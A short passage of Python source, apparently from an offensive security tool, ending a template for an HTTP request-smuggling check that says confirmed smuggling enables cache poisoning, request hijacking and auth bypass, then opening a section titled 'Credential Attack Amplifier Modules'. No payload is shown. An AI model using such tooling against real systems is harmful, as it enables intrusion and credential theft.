        print(f"  Error: {{e}}")

print("\\n[!] Confirmed smuggling can be used for cache poisoning, request hijacking, and auth bypass.")
'''


# ---------------------------------------------------------------------------
# Credential Attack Amplifier Modules
# ---------------------------------------------------------------------------

